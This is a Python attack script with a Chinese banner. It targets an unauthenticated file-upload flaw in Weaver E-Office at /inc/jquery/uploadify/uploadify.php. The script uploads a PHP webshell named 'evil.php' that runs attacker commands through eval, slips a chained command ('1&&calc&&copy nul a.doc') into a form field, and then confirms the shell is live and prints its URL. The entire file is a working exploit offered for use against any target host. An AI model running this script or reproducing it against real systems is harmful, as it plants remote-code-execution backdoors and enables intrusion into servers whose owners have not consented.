# encoding: utf-8
import requests
import sys
import argparse
import xml.etree.ElementTree as ET

def get_args():
    parser=argparse.ArgumentParser(
            prog='U8OA-leak.py',description='input url to run the script')
    parser.add_argument("-u","--url",type=str,help='input url')
    parser.add_argument("-v","--version",action='version',version='%(prog)s 1.0')
    args=parser.parse_args()
    return args

def main():
    try:

        print(r"""                                ,-.
                               ( O_)
                              / `-/
                             /-. /
                            /   )
                           /   /
              _           /-. /
             (_)*-._     /   )
               *-._ *-'**( )/
                   *-/*-._* `.
                    /     *-.'._
                   /\       /-._*-._
                  /  ) _,-*/    *-(_)
                 / // /   /
 _     _        /    _   / _ ____                       _
| |   (_) __ _ _   _(_) __| / ___|_      _____  _ __ __| |
| |   | |/ _` | | | | |/ _` \___ \ \ /\ / / _ \| '__/ _` |
| |___| | (_| | |_| | | (_| |___) \ V  V / (_) | | | (_| |
|_____|_|\__, |\__,_|_|\__,_|____/ \_/\_/ \___/|_|  \__,_|
            |_|
         /  / /    /
        /  / / L  /
       /  / / Z  /
      /  / / J  /
     /  |,'    /
    :   /     /
    [  /   ,'
    | /  ,'
    |/,-'
    '
          """)
        print("***********************************************")
        print("*         泛微E-Office前台文件上传漏洞        *")
        print("*               V1.0  by 液体剑               *")
        print("***********************************************\n")

        args=get_args()
        url=args.url
        URL="http://"+url+"/inc/jquery/uploadify/uploadify.php"
        headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary1ZCUAAAXxnYuVIZR',
    'Referer': 'http://172.16.10.124/general/file_folder/file_new/neworedit/index.php?FILE_SORT=1&func_id=7',
    'Cookie': 'LOGIN_LANG=cn; PHPSESSID=16a132db599e8d54a45e704389a29686'
    }
        data = '''------WebKitFormBoundary1ZCUAAAXxnYuVIZR
Content-Disposition: form-data; name="name"

1&&calc&&copy nul a.doc
------WebKitFormBoundary1ZCUAAAXxnYuVIZR
Content-Disposition: form-data; name="Filedata"; filename="evil.php"
Content-Type: application/msword

<?php @eval($_REQUEST['cmd']);?>
------WebKitFormBoundary1ZCUAAAXxnYuVIZR-'''
        response = requests.post(URL, headers=headers, data=data)
        if(response.status_code==200):
            code=response.text
            u="http://"+url+"/attachment/"+code+"/evil.php?cmd=phpinfo();"
            req=requests.post(u)
            res=req.status_code
            if(res==200):
                print("\033[32m[+] 上传成功!!!\033[0m")
                print("\033[32m[+] webshell: \033[0m"+u)
            else:
                print("\033[0;31;40m[-] 上传失败...\033[0m")

        else:
            print("\033[0;31;40m[-] 请确认目标系统是否为泛微-EOffice\033[0m")

    except:
        print("\033[0;31;40mERROR!\033[0m")

if __name__=="__main__":
    get_args()
    main()
